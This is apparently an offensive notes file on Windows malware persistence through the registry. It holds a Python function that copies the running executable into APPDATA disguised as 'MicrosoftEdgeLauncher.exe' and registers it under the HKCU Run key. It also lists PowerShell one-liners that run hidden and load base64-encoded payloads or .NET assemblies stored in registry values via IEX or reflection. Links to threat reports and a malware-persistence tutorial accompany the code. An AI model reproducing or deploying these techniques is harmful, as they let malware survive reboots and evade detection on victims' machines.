# Scripting

## Python

```python
import os
import shutil
from sys import executable

masquerade_payload_name = "MicrosoftEdgeLauncher.exe" # Disguise the payload as Microsoft Edge
registry_value = "MicrosoftEdge"
registry_type = "REG_SZ"

def persistence() -> None:
    location = os.environ['APPDATA'] + "\\" + masquerade_payload_name

    if not os.path.exists(location):
        # Copy the payload to that new location
        shutil.copyfile(executable, location)
        # Add the payload to registry startup
        subprocess.call(f'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {registry_value} /t {registry_type} /d "{location}" ', shell=True)

if __name__ == "__main__":
    persistence()
```

## PowerShell

TODO: Other ideas is to use registries to include shellcode and execute it.

https://blog.sonicwall.com/en-us/2022/06/guloader-a-fileless-shellcode-based-malware-in-action/

```
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c "sleep 0; IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:SOFTWARE\<registry_key>').GetValue('<registry_value_name>'))))"
```

```powershell
powershell -Command " [Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty 'HKCU:\Software\Classes\<registry_key>').b64encAssembly)); [CMD_exec.Class1]::RunCMD()"

powershell IEX ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((get-itemproperty 'HKCU:\Software\Classes\<registry_key>').b64encPS)))

powershell -Command " [Reflection.Assembly]::Load(([System.IO.File]::ReadAllBytes('C:\path\to\payload.dll')); [CMD_exec.Class1]::RunCMD();"

powershell -Command " [Reflection.Assembly]::LoadFile('C:\path\to\payload.dll'); [CMD_exec.Class1]::RunCMD();"

powershell IEX (Get-Content C:\path\to\payload.ps1 -Raw)
```

https://az4n6.blogspot.com/2018/06/malicious-powershell-in-registry.html

adding registry persistence by spliting the shellcode hexadecimal

https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/

---
## References

### The Python Code

- [The Python Code: How to Make Malware Persistent in Python](https://thepythoncode.com/article/how-to-create-malware-persistent-in-python)
